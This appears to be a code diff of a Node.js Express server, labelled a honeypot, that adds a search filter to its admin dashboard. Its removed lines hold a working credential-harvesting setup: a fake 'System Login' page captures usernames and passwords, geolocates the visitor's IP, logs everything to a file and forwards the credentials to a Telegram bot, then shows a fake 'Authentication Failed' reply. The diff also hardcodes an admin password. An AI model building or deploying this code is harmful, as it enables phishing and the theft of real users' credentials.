@@ -1,120 +1,4 @@
-const express = require('express');
-const basicAuth = require('express-basic-auth');
-const useragent = require('express-useragent');
-const axios = require('axios');
-const fs = require('fs');
-const path = require('path');
-
-const app = express();
-const PORT = 4000;
-const LOG_FILE = path.join(__dirname, 'logs.json');
-
-// Telegram Bot Configuration (Apna Bot Token aur Chat ID yahan daalein)
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
-
-// Middleware setup
-app.use(useragent.express());
-app.use(express.urlencoded({ extended: true }));
-
-// Helper to prevent XSS by escaping HTML characters
-function escapeHtml(text) {
-    if (!text) return '';
-    return String(text)
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
-}
-
-// Function to send instant Telegram alert
-async function sendTelegramAlert(logEntry) {
-    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
-    
-    const message = `🚨 *New Honeypot Capture!*\n\n` +
-                    `👤 *User:* ${escapeHtml(logEntry.username)}\n` +
-                    `🔑 *Pass:* ${escapeHtml(logEntry.password)}\n` +
-                    `🌐 *IP:* ${logEntry.ip}\n` +
-                    `📍 *Location:* ${logEntry.location?.city || 'N/A'}, ${logEntry.location?.country || 'N/A'}\n` +
-                    `💻 *Device:* ${logEntry.browser} / ${logEntry.os}`;
-
-    try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
-    } catch (err) {
-        console.error('Telegram alert failed:', err.message);
-    }
-}
-
-// Helper function to read and append logs to file
-function saveLog(newLog) {
-    let logs = [];
-    if (fs.existsSync(LOG_FILE)) {
-        try {
-            const data = fs.readFileSync(LOG_FILE, 'utf8');
-            logs = JSON.parse(data);
-        } catch (err) {
-            logs = [];
-        }
-    }
-    logs.push(newLog);
-    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
-}
-
-// Public Trap Page (Root)
-app.get('/', async (req, res) => {
-    res.send(`
-        <!DOCTYPE html>
-        <html>
-        <head><title>Login Portal</title></head>
-        <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
-            <h2>System Login</h2>
-            <form action="/login" method="POST">
-                <input type="text" name="username" placeholder="Username" required style="padding: 8px; margin: 5px;"/><br>
-                <input type="password" name="password" placeholder="Password" required style="padding: 8px; margin: 5px;"/><br>
-                <button type="submit" style="padding: 8px 15px; margin-top: 10px;">Sign In</button>
-            </form>
-        </body>
-        </html>
-    `);
-});
-
-// Capture credentials when form is submitted
-app.post('/login', async (req, res) => {
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const ua = req.useragent;
-    const { username, password } = req.body;
-
-    let geoData = {};
-    try {
-        const response = await axios.get(`http://ip-api.com/json/${ip}`);
-        geoData = response.data;
-    } catch (err) {
-        console.error('IP lookup failed:', err.message);
-    }
-
-    const logEntry = {
-        time: new Date().toLocaleString(),
-        ip,
-        username,
-        password,
-        browser: ua.browser,
-        os: ua.os,
-        device: ua.platform,
-        location: geoData
-    };
-
-    saveLog(logEntry);
-    await sendTelegramAlert(logEntry);
-
-    res.send('<h3>Authentication Failed. Please try again.</h3>');
-});
-
-// Protected Admin Dashboard with Download Button & Sanitized Inputs
+// Protected Admin Dashboard with Search Filter, Download Button & Sanitized Inputs
 app.get('/dashboard', basicAuth({
     users: { 'admin': 'SuperSecretPassword123' },
     challenge: true,
@@ -129,7 +13,15 @@ app.get('/dashboard', basicAuth({
         }
     }
 
-    const rows = logs.map(log => {
+    // Search query capture karein (Username ya IP ke basis par)
+    const searchQuery = req.query.search ? req.query.search.toLowerCase() : '';
+    const filteredLogs = logs.filter(log => {
+        const username = log.username ? log.username.toLowerCase() : '';
+        const ip = log.ip ? log.ip.toLowerCase() : '';
+        return username.includes(searchQuery) || ip.includes(searchQuery);
+    });
+
+    const rows = filteredLogs.map(log => {
         const city = log.location && log.location.city ? log.location.city : 'N/A';
         const country = log.location && log.location.country ? log.location.country : 'N/A';
         
@@ -153,20 +45,34 @@ app.get('/dashboard', basicAuth({
             <style>
                 body { font-family: Arial, sans-serif; margin: 30px; background: #f4f4f9; color: #333; }
                 h2 { color: #2c3e50; display: inline-block; }
-                .btn { background-color: #27ae60; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; float: right; font-weight: bold; }
+                .btn { background-color: #27ae60; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; font-weight: bold; }
                 .btn:hover { background-color: #219653; }
-                table { width: 100%; border-collapse: collapse; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-top: 20px; border-radius: 5px; overflow: hidden; clear: both; }
+                .top-bar { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+                .search-box { margin: 15px 0; }
+                .search-box input { padding: 8px; width: 250px; border: 1px solid #ccc; border-radius: 4px; }
+                .search-box button { padding: 8px 12px; background: #2980b9; color: white; border: none; border-radius: 4px; cursor: pointer; }
+                table { width: 100%; border-collapse: collapse; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-top: 10px; border-radius: 5px; overflow: hidden; }
                 th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #ddd; }
                 th { background-color: #2c3e50; color: white; }
                 tr:hover { background-color: #f1f1f1; }
             </style>
         </head>
         <body>
-            <div>
+            <div class="top-bar">
                 <h2>Captured Credentials & Visitor Logs</h2>
                 <a href="/dashboard/download" class="btn">Download Logs (JSON)</a>
             </div>
-            <p>Total Captures: <strong>${logs.length}</strong></p>
+            
+            <div class="search-box">
+                <form action="/dashboard" method="GET">
+                    <input type="text" name="search" placeholder="Search by Username or IP..." value="${escapeHtml(searchQuery)}" />
+                    <button type="submit">Search</button>
+                    <a href="/dashboard" style="margin-left: 10px; text-decoration: none; color: #e74c3c;">Reset</a>
+                </form>
+            </div>
+
+            <p>Showing <strong>${filteredLogs.length}</strong> of <strong>${logs.length}</strong> total captures</p>
+            
             <table>
                 <thead>
                     <tr>
@@ -179,28 +85,10 @@ app.get('/dashboard', basicAuth({
                     </tr>
                 </thead>
                 <tbody>
-                    ${rows.length > 0 ? rows : '<tr><td colspan="6" style="text-align:center;">No logs captured yet.</td></tr>'}
+                    ${rows.length > 0 ? rows : '<tr><td colspan="6" style="text-align:center;">No matching logs found.</td></tr>'}
                 </tbody>
             </table>
         </body>
         </html>
     `);
-});
-
-// Protected Route to Download the JSON File
-app.get('/dashboard/download', basicAuth({
-    users: { 'admin': 'SuperSecretPassword123' },
-    challenge: true,
-    realm: 'HoneypotAdminArea'
-}), (req, res) => {
-    if (fs.existsSync(LOG_FILE)) {
-        res.download(LOG_FILE);
-    } else {
-        res.status(404).send('No logs found to download.');
-    }
-});
-
-// Start Server
-app.listen(PORT, () => {
-    console.log(`Honeypot Server running on port ${PORT}`);
 });
